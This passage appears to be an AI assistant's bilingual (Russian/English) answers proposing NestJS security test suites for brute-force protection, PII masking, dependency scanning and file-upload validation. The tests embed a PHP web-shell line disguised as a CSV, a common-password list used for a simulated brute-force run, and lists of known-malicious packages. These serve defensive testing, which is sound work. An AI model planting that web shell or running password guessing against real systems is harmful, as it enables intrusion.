    const csrfCookie = cookies.find((c: string) => c.includes('XSRF-TOKEN'));

    expect(csrfCookie).toContain('SameSite=Strict');
    console.log('‚úÖ SameSite=Strict cookie attribute set');
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: `user-${Date.now()}`, role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateApiToken(): string {
  return jwt.sign(
    { clientId: 'pos-system', type: 'API_TOKEN' },
    process.env.JWT_SECRET
  );
}
```


***

### **36. Rate Limiting - –±—Ä—É—Ç—Ñ–æ—Ä—Å –∑–∞—â–∏—Ç–∞?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Login endpoint –ø–æ–¥–≤–µ—Ä–∂–µ–Ω –±—Ä—É—Ç—Ñ–æ—Ä—Å—É.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Send 5 login attempts ‚Üí all succeed
- B) Send 10 login attempts ‚Üí –ø–æ—Å–ª–µ–¥–Ω–∏–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã (429)
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å account lockout –ø–æ—Å–ª–µ N failed attempts
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å exponential backoff

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- –ë—Ä—É—Ç—Ñ–æ—Ä—Å = —á–∞—Å—Ç–∞—è –∞—Ç–∞–∫–∞ –Ω–∞ login
- Account lockout –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è security
- Exponential backoff –∑–∞–º–µ–¥–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–≥–æ

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/brute-force.security.spec.ts
describe('Brute Force Protection', () => {
  let app: INestApplication;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear rate limit counters
  });

  // Test 1: Normal Login Attempts (Under Limit)
  it('should allow 5 login attempts', async () => {
    const phone = '+79991234567';

    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401); // Wrong password, but not rate limited
    }

    console.log('‚úÖ 5 login attempts allowed');
  });

  // Test 2: Rate Limiting After 10 Attempts
  it('should rate limit after 10 failed login attempts', async () => {
    const phone = '+79991234567';

    // First 10 attempts should return 401 (unauthorized)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // 11th attempt should be rate limited
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong-password' })
      .expect(429);

    expect(response.body.message).toContain('Too many requests');
    expect(response.headers['retry-after']).toBeDefined();

    console.log('‚úÖ Rate limited after 10 attempts');
  });

  // Test 3: Account Lockout After Failed Attempts
  it('should lock account after 10 failed attempts', async () => {
    const phone = '+79991234567';

    // 10 failed attempts
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Even with correct password, account should be locked
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'correct-password' })
      .expect(423); // 423 Locked

    expect(response.body.message).toContain('locked');
    expect(response.body.lockedUntil).toBeDefined();

    console.log('‚úÖ Account locked after 10 failed attempts');
  });

  // Test 4: Exponential Backoff
  it('should implement exponential backoff', async () => {
    const phone = '+79991234567';
    const delays: number[] = [];

    for (let i = 0; i < 15; i++) {
      const startTime = Date.now();

      const response = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' });

      const delay = Date.now() - startTime;
      delays.push(delay);

      if (response.status === 429) {
        const retryAfter = parseInt(response.headers['retry-after']);
        console.log(`Attempt ${i + 1}: Rate limited, retry after ${retryAfter}s`);

        // Wait before next attempt
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
      }
    }

    console.log('=== Exponential Backoff ===');
    console.log(`Delays: ${delays.join('ms, ')}ms`);

    // Delays should increase exponentially
    expect(delays[12]).toBeGreaterThan(delays[5] * 2);
  });

  // Test 5: IP-Based Rate Limiting
  it('should rate limit by IP address', async () => {
    const ip1 = '192.168.1.100';
    const ip2 = '192.168.1.101';

    // IP1: exhaust rate limit
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', ip1)
        .send({ phone: '+79991111111', password: 'wrong' })
        .expect(401);
    }

    // IP1: rate limited
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip1)
      .send({ phone: '+79991111111', password: 'wrong' })
      .expect(429);

    // IP2: not rate limited
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip2)
      .send({ phone: '+79992222222', password: 'wrong' })
      .expect(401); // Not rate limited

    console.log('‚úÖ IP-based rate limiting working');
  });

  // Test 6: Reset Counter on Successful Login
  it('should reset failed attempts counter on success', async () => {
    const phone = '+79991234567';

    // 5 failed attempts
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Successful login
    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'correct-password' })
      .expect(200);

    // Counter should be reset (can do 10 more attempts)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    console.log('‚úÖ Failed attempts counter reset on success');
  });

  // Test 7: CAPTCHA After N Failed Attempts
  it('should require CAPTCHA after 5 failed attempts', async () => {
    const phone = '+79991234567';

    // 5 failed attempts
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // 6th attempt should require CAPTCHA
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong-password' })
      .expect(403);

    expect(response.body.message).toContain('CAPTCHA');
    expect(response.body.captchaRequired).toBe(true);

    console.log('‚úÖ CAPTCHA required after 5 failed attempts');
  });

  // Test 8: Distributed Brute Force (Multiple IPs)
  it('should detect distributed brute force', async () => {
    const phone = '+79991234567';

    // Attack from 10 different IPs (2 attempts each)
    for (let ip = 1; ip <= 10; ip++) {
      for (let attempt = 0; attempt < 2; attempt++) {
        await request(app.getHttpServer())
          .post('/api/v1/auth/login')
          .set('X-Forwarded-For', `192.168.1.${ip}`)
          .send({ phone, password: 'wrong-password' })
          .expect(401);
      }
    }

    // Total 20 attempts on same phone number
    // Should trigger distributed attack detection
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', '192.168.1.100')
      .send({ phone, password: 'correct-password' })
      .expect(423); // Account locked

    expect(response.body.message).toContain('suspicious activity');

    console.log('‚úÖ Distributed brute force detected');
  });

  // Test 9: Notification on Suspicious Activity
  it('should send alert on brute force attempt', async () => {
    const phone = '+79991234567';
    const notificationService = app.get('NotificationService');

    jest.spyOn(notificationService, 'send');

    // 10 failed attempts (triggers alert)
    for (let i = 0; i < 10; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password: 'wrong-password' })
        .expect(401);
    }

    // Verify notification sent
    expect(notificationService.send).toHaveBeenCalledWith(
      expect.objectContaining({
        type: 'SECURITY_ALERT',
        message: expect.stringContaining('suspicious login attempts'),
      })
    );

    console.log('‚úÖ Security alert sent on brute force');
  });

  // Test 10: Automated Brute Force Testing
  it('should simulate automated brute force attack', async () => {
    const phone = '+79991234567';
    const passwords = [
      '123456', 'password', '12345678', 'qwerty', '123456789',
      'password1', 'abc123', '111111', '1234567', 'dragon',
    ];

    let successCount = 0;
    let blockedCount = 0;

    for (const password of passwords) {
      const response = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ phone, password });

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429 || response.status === 423) {
        blockedCount++;
      }
    }

    console.log('=== Brute Force Simulation ===');
    console.log(`Passwords tried: ${passwords.length}`);
    console.log(`Successful: ${successCount}`);
    console.log(`Blocked: ${blockedCount}`);

    expect(blockedCount).toBeGreaterThan(0);
  });
});
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ 4 –≤–æ–ø—Ä–æ—Å–∞–º–∏ (37-40) Security Testing? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **37. Sensitive Data Exposure - PII –∑–∞—â–∏—Ç–∞?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –õ–æ–≥–∏ –Ω–µ –¥–æ–ª–∂–Ω—ã —Å–æ–¥–µ—Ä–∂–∞—Ç—å phone numbers, card numbers.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Check logs –¥–ª—è phone numbers
- B) Check database encryption (at rest)
- C) B + check TLS/HTTPS (in transit)
- D) C + check data masking –≤ API responses

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- PII –≤ –ª–æ–≥–∞—Ö = GDPR violation
- Encryption at rest + in transit –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã
- Data masking –≤ API responses –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç —Å–ª—É—á–∞–π–Ω–æ–π —É—Ç–µ—á–∫–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/sensitive-data.security.spec.ts
describe('Sensitive Data Exposure Protection', () => {
  let app: INestApplication;
  let logCapture: string[] = [];

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();

    // Capture logs for testing
    const logger = app.get('Logger');
    const originalLog = logger.log;
    const originalError = logger.error;

    logger.log = jest.fn((...args) => {
      logCapture.push(args.join(' '));
      originalLog.apply(logger, args);
    });

    logger.error = jest.fn((...args) => {
      logCapture.push(args.join(' '));
      originalError.apply(logger, args);
    });

    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(() => {
    logCapture = [];
  });

  // Test 1: Phone Numbers Not Logged
  it('should not log phone numbers in plaintext', async () => {
    const phone = '+79991234567';

    await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'test123' })
      .expect(401); // Wrong password

    // Check logs
    const logsWithPhone = logCapture.filter(log => log.includes(phone));

    console.log('=== Log Analysis ===');
    console.log(`Total logs: ${logCapture.length}`);
    console.log(`Logs with phone number: ${logsWithPhone.length}`);

    if (logsWithPhone.length > 0) {
      console.log('‚ö†Ô∏è Phone numbers found in logs:');
      logsWithPhone.forEach(log => console.log(`  ${log}`));
    }

    expect(logsWithPhone).toHaveLength(0);
    console.log('‚úÖ Phone numbers not logged');
  });

  // Test 2: Credit Card Masking
  it('should mask credit card numbers in logs', async () => {
    const cardNumber = '4532015112830366'; // Test card

    await request(app.getHttpServer())
      .post('/api/v1/payment/process')
      .send({
        cardNumber,
        cvv: '123',
        expiry: '12/25',
      });

    // Check logs for full card number
    const logsWithCard = logCapture.filter(log => log.includes(cardNumber));

    expect(logsWithCard).toHaveLength(0);

    // Should be masked: ************0366
    const maskedLogs = logCapture.filter(log => log.includes('*******0366'));
    expect(maskedLogs.length).toBeGreaterThan(0);

    console.log('‚úÖ Credit card numbers masked in logs');
  });

  // Test 3: Password Not Logged
  it('should never log passwords', async () => {
    const password = 'MySecretPassword123!';

    await request(app.getHttpServer())
      .post('/api/v1/auth/register')
      .send({
        phone: '+79991234567',
        password,
        confirmPassword: password,
      });

    const logsWithPassword = logCapture.filter(log => 
      log.includes(password) || log.includes('password')
    );

    // Should not contain actual password
    const logsWithActualPassword = logCapture.filter(log => log.includes(password));
    expect(logsWithActualPassword).toHaveLength(0);

    console.log('‚úÖ Passwords not logged');
  });

  // Test 4: Data Masking in API Response
  it('should mask phone numbers in API responses', async () => {
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Phone numbers should be masked: +7999***4567
    const guests = response.body.data;
    for (const guest of guests) {
      expect(guest.phone).toMatch(/^\+\d{4}\*{3}\d{4}$/);
      expect(guest.phone).not.toMatch(/^\+\d{11}$/); // Full phone
    }

    console.log('‚úÖ Phone numbers masked in API response');
  });

  // Test 5: Database Encryption at Rest
  it('should encrypt sensitive fields in database', async () => {
    const prisma = app.get(PrismaClient);

    // Create user with sensitive data
    const user = await prisma.user.create({
      data: {
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: 'John',
            passportNumber: '1234 567890', // Sensitive!
          },
        },
      },
    });

    // Query raw database
    const rawUser = await prisma.$queryRaw<any[]>`
      SELECT * FROM "User" WHERE id = ${user.id}
    `;

    const rawProfile = await prisma.$queryRaw<any[]>`
      SELECT * FROM "GuestProfile" WHERE "userId" = ${user.id}
    `;

    // Check if passport number is encrypted in DB
    expect(rawProfile[0].passportNumber).not.toBe('1234 567890');
    expect(rawProfile[0].passportNumber).toMatch(/^[a-f0-9]{32,}$/); // Encrypted hash

    console.log('‚úÖ Sensitive fields encrypted in database');
  });

  // Test 6: TLS/HTTPS Enforced
  it('should enforce HTTPS for all requests', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Check security headers
    expect(response.headers['strict-transport-security']).toBeDefined();
    expect(response.headers['strict-transport-security']).toContain('max-age=');

    console.log('‚úÖ HSTS header set (HTTPS enforced)');
  });

  // Test 7: JWT Token Not Logged
  it('should not log JWT tokens', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check logs for full token
    const logsWithToken = logCapture.filter(log => log.includes(token));

    expect(logsWithToken).toHaveLength(0);

    // Should be masked: Bearer ey...***
    const maskedLogs = logCapture.filter(log => log.includes('Bearer ey') && log.includes('***'));
    
    console.log('‚úÖ JWT tokens not logged in plaintext');
  });

  // Test 8: PII Redaction in Error Messages
  it('should redact PII from error messages', async () => {
    const phone = '+79991234567';

    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({ phone, password: 'wrong' })
      .expect(401);

    // Error message should not contain phone number
    expect(response.body.message).not.toContain(phone);
    expect(response.body.message).not.toContain('9991234567');

    console.log('‚úÖ PII redacted from error messages');
  });

  // Test 9: Database Connection String Not Exposed
  it('should not expose database credentials', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Check if any response contains DB credentials
    expect(response.text).not.toContain(process.env.DATABASE_URL);
    expect(response.text).not.toContain('postgresql://');

    // Check logs
    const logsWithDbUrl = logCapture.filter(log => 
      log.includes('postgresql://') || log.includes(process.env.DATABASE_URL)
    );

    expect(logsWithDbUrl).toHaveLength(0);

    console.log('‚úÖ Database credentials not exposed');
  });

  // Test 10: Data Minimization in Responses
  it('should return only necessary fields', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Should NOT include sensitive internal fields
    expect(response.body).not.toHaveProperty('passwordHash');
    expect(response.body).not.toHaveProperty('refreshToken');
    expect(response.body).not.toHaveProperty('internalId');

    console.log('‚úÖ Data minimization applied');
  });

  // Test 11: Audit Logs for PII Access
  it('should log access to PII', async () => {
    const token = generateAdminToken();

    await request(app.getHttpServer())
      .get('/api/v1/admin/guests/user-1')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check audit log
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'PII_ACCESS',
        targetId: 'user-1',
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.userId).toBe('admin-1');
    expect(auditLog.metadata).toMatchObject({
      fields: expect.arrayContaining(['phone', 'passportNumber']),
    });

    console.log('‚úÖ PII access logged in audit trail');
  });

  // Test 12: Email Masking
  it('should mask email addresses in responses', async () => {
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/users')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const users = response.body.data;
    for (const user of users) {
      if (user.email) {
        // Email should be masked: j***@example.com
        expect(user.email).toMatch(/^[a-z]\*{3}@/);
      }
    }

    console.log('‚úÖ Email addresses masked');
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

### **38. Dependency Vulnerabilities - npm audit?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Third-party packages –º–æ–≥—É—Ç –∏–º–µ—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç–∏.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Manual `npm audit`
- B) Automated `npm audit` –≤ CI/CD
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å Snyk/Dependabot alerts
- D) C + automated dependency updates —Å tests

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Dependency vulnerabilities = —á–∞—Å—Ç–∞—è –ø—Ä–∏—á–∏–Ω–∞ breaches
- Automated scanning –Ω–∞—Ö–æ–¥–∏—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ä–∞–Ω–æ
- Automated updates –¥–µ—Ä–∂–∞—Ç dependencies –∞–∫—Ç—É–∞–ª—å–Ω—ã–º–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/dependencies.security.spec.ts
import { execSync } from 'child_process';

describe('Dependency Vulnerability Scanning', () => {
  // Test 1: npm audit (no critical vulnerabilities)
  it('should have no critical vulnerabilities', () => {
    let auditOutput: string;

    try {
      auditOutput = execSync('npm audit --json', { encoding: 'utf8' });
    } catch (error) {
      auditOutput = error.stdout.toString();
    }

    const audit = JSON.parse(auditOutput);

    console.log('=== npm audit Results ===');
    console.log(`Total vulnerabilities: ${audit.metadata.vulnerabilities.total}`);
    console.log(`  Info: ${audit.metadata.vulnerabilities.info}`);
    console.log(`  Low: ${audit.metadata.vulnerabilities.low}`);
    console.log(`  Moderate: ${audit.metadata.vulnerabilities.moderate}`);
    console.log(`  High: ${audit.metadata.vulnerabilities.high}`);
    console.log(`  Critical: ${audit.metadata.vulnerabilities.critical}`);

    // Fail if critical vulnerabilities found
    expect(audit.metadata.vulnerabilities.critical).toBe(0);

    // Warn if high vulnerabilities found
    if (audit.metadata.vulnerabilities.high > 0) {
      console.warn(`‚ö†Ô∏è ${audit.metadata.vulnerabilities.high} high severity vulnerabilities found`);
    }
  });

  // Test 2: Check for outdated packages
  it('should not have severely outdated packages', () => {
    const outdatedOutput = execSync('npm outdated --json || true', { encoding: 'utf8' });

    if (!outdatedOutput.trim()) {
      console.log('‚úÖ All packages up to date');
      return;
    }

    const outdated = JSON.parse(outdatedOutput);
    const severelyOutdated: string[] = [];

    for (const [pkg, info] of Object.entries(outdated as any)) {
      const current = info.current.split('.').map(Number);
      const latest = info.latest.split('.').map(Number);

      // Major version behind
      if (latest[0] > current[0]) {
        severelyOutdated.push(`${pkg}: ${info.current} -> ${info.latest}`);
      }
    }

    console.log('=== Outdated Packages ===');
    if (severelyOutdated.length > 0) {
      console.log('‚ö†Ô∏è Severely outdated packages:');
      severelyOutdated.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('‚úÖ No severely outdated packages');
    }

    // Fail if more than 10 major versions behind
    expect(severelyOutdated.length).toBeLessThan(10);
  });

  // Test 3: Known Vulnerable Packages
  it('should not use known vulnerable packages', () => {
    const knownVulnerable = [
      'event-stream@3.3.6', // Malicious code
      'eslint-scope@3.7.2', // Compromised
      'flatmap-stream@0.1.1', // Malicious
      'lodash@4.17.11', // Prototype pollution
    ];

    const packageJson = require('../../../package.json');
    const allDeps = {
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    };

    const found: string[] = [];

    for (const vuln of knownVulnerable) {
      const [pkg, version] = vuln.split('@');
      if (allDeps[pkg] === version) {
        found.push(vuln);
      }
    }

    if (found.length > 0) {
      console.error('‚ö†Ô∏è Known vulnerable packages found:');
      found.forEach(pkg => console.error(`  - ${pkg}`));
    }

    expect(found).toHaveLength(0);
  });

  // Test 4: Snyk Vulnerability Scan
  it('should pass Snyk security scan', async () => {
    try {
      const snykOutput = execSync('snyk test --json', { encoding: 'utf8' });
      const snykResult = JSON.parse(snykOutput);

      console.log('=== Snyk Scan Results ===');
      console.log(`Vulnerabilities: ${snykResult.vulnerabilities?.length || 0}`);

      const critical = snykResult.vulnerabilities?.filter(v => v.severity === 'critical') || [];
      const high = snykResult.vulnerabilities?.filter(v => v.severity === 'high') || [];

      console.log(`  Critical: ${critical.length}`);
      console.log(`  High: ${high.length}`);

      expect(critical.length).toBe(0);
    } catch (error) {
      console.log('‚ö†Ô∏è Snyk not configured or scan failed');
    }
  });

  // Test 5: License Compliance
  it('should only use approved licenses', () => {
    const approvedLicenses = [
      'MIT',
      'Apache-2.0',
      'BSD-2-Clause',
      'BSD-3-Clause',
      'ISC',
      'CC0-1.0',
      'Unlicense',
    ];

    const licenseChecker = require('license-checker');

    return new Promise((resolve, reject) => {
      licenseChecker.init(
        {
          start: process.cwd(),
          production: true,
        },
        (err, packages) => {
          if (err) {
            reject(err);
            return;
          }

          const violations: string[] = [];

          for (const [pkg, info] of Object.entries(packages as any)) {
            const license = info.licenses;
            
            if (!approvedLicenses.includes(license)) {
              violations.push(`${pkg}: ${license}`);
            }
          }

          console.log('=== License Compliance ===');
          if (violations.length > 0) {
            console.log('‚ö†Ô∏è Unapproved licenses:');
            violations.forEach(v => console.log(`  - ${v}`));
          } else {
            console.log('‚úÖ All licenses approved');
          }

          // Warn but don't fail (some licenses might be acceptable)
          if (violations.length > 0) {
            console.warn(`Found ${violations.length} packages with unapproved licenses`);
          }

          resolve(null);
        }
      );
    });
  });

  // Test 6: SBOM (Software Bill of Materials) Generation
  it('should generate SBOM', () => {
    const sbomOutput = execSync('npm ls --json --all', { encoding: 'utf8' });
    const sbom = JSON.parse(sbomOutput);

    const sbomPath = path.join(__dirname, '../../../sbom.json');
    fs.writeFileSync(sbomPath, JSON.stringify(sbom, null, 2));

    console.log(`‚úÖ SBOM generated: ${sbomPath}`);

    expect(fs.existsSync(sbomPath)).toBe(true);
  });

  // Test 7: Typosquatting Detection
  it('should detect potential typosquatting', () => {
    const packageJson = require('../../../package.json');
    const allDeps = Object.keys({
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    });

    const suspiciousPatterns = [
      /^[a-z]{1,3}$/, // Very short names
      /\d{5,}/, // Lots of numbers
      /[^\w-]/, // Special characters
    ];

    const suspicious: string[] = [];

    for (const dep of allDeps) {
      for (const pattern of suspiciousPatterns) {
        if (pattern.test(dep)) {
          suspicious.push(dep);
          break;
        }
      }
    }

    console.log('=== Typosquatting Detection ===');
    if (suspicious.length > 0) {
      console.log('‚ö†Ô∏è Suspicious package names:');
      suspicious.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('‚úÖ No suspicious packages detected');
    }
  });

  // Test 8: Check for Deprecated Packages
  it('should not use deprecated packages', async () => {
    const packageJson = require('../../../package.json');
    const allDeps = {
      ...packageJson.dependencies,
      ...packageJson.devDependencies,
    };

    const deprecated: string[] = [];

    for (const [pkg, version] of Object.entries(allDeps)) {
      try {
        const npmInfo = execSync(`npm view ${pkg}@${version} deprecated --json`, {
          encoding: 'utf8',
        });

        if (npmInfo.trim() && npmInfo !== 'null') {
          deprecated.push(`${pkg}@${version}: ${npmInfo.trim()}`);
        }
      } catch (error) {
        // Package not found or no deprecation info
      }
    }

    console.log('=== Deprecated Packages ===');
    if (deprecated.length > 0) {
      console.log('‚ö†Ô∏è Deprecated packages found:');
      deprecated.forEach(pkg => console.log(`  - ${pkg}`));
    } else {
      console.log('‚úÖ No deprecated packages');
    }

    expect(deprecated.length).toBeLessThan(5);
  });
});
```

**CI/CD Integration (GitHub Actions):**

```yaml
# .github/workflows/security.yml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 0 * * 0' # Weekly

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: npm audit
        run: npm audit --audit-level=critical
      
      - name: Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'max-loyalty'
          path: '.'
          format: 'HTML'
      
      - name: Upload Dependency Check Report
        uses: actions/upload-artifact@v3
        with:
          name: dependency-check-report
          path: reports

  dependabot:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Enable Dependabot
        run: |
          echo "Dependabot configured in .github/dependabot.yml"
```

**Dependabot Config:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    
    # Auto-merge minor and patch updates
    ignore:
      - dependency-name: "*"
        update-types: ["version-update:semver-major"]
```


***

### **39. File Upload Security - malicious files?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Admin –∑–∞–≥—Ä—É–∂–∞–µ—Ç CSV —Å transaction data.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Upload CSV ‚Üí check file extension
- B) Upload malicious file (exe, php) ‚Üí reject
- C) B + virus scan (ClamAV)
- D) C + check for zip bombs, CSV injection

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- File extension –ø—Ä–æ–≤–µ—Ä–∫–∞ –ª–µ–≥–∫–æ –æ–±—Ö–æ–¥–∏—Ç—Å—è
- Virus scanning –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω
- Zip bombs –∏ CSV injection = —á–∞—Å—Ç—ã–µ –∞—Ç–∞–∫–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/file-upload.security.spec.ts
describe('File Upload Security', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: File Extension Validation
  it('should reject disallowed file extensions', async () => {
    const token = generateAdminToken();

    const maliciousExtensions = [
      'evil.exe',
      'hack.php',
      'virus.bat',
      'malware.sh',
      'exploit.js',
    ];

    for (const filename of maliciousExtensions) {
      const filePath = path.join(__dirname, filename);
      fs.writeFileSync(filePath, 'malicious content');

      const response = await request(app.getHttpServer())
        .post('/api/v1/admin/upload')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', filePath)
        .expect(400);

      expect(response.body.message).toContain('Invalid file type');

      fs.unlinkSync(filePath);
    }

    console.log(`‚úÖ Blocked ${maliciousExtensions.length} malicious extensions`);
  });

  // Test 2: MIME Type Validation
  it('should validate MIME type (not just extension)', async () => {
    const token = generateAdminToken();

    // Create PHP file disguised as CSV
    const filePath = path.join(__dirname, 'fake.csv');
    fs.writeFileSync(filePath, '<?php system($_GET["cmd"]); ?>');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(400);

    expect(response.body.message).toContain('Invalid file type');

    fs.unlinkSync(filePath);
    console.log('‚úÖ MIME type validation working');
  });

  // Test 3: File Size Limit
  it('should enforce file size limit', async () => {
    const token = generateAdminToken();

    // Create 101MB file (exceeds 100MB limit)
    const filePath = path.join(__dirname, 'large.csv');
    const stream = fs.createWriteStream(filePath);
    
    for (let i = 0; i < 101; i++) {
      stream.write('x'.repeat(1024 * 1024)); // 1MB
    }
    stream.end();

    await new Promise(resolve => stream.on('finish', resolve));

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(413); // Payload Too Large

    expect(response.body.message).toContain('File too large');

    fs.unlinkSync(filePath);
    console.log('‚úÖ File size limit enforced');
  });

  // Test 4: Virus Scanning (ClamAV)
  it('should scan files for viruses', async () => {
    const token = generateAdminToken();

    // EICAR test file (safe virus test signature)
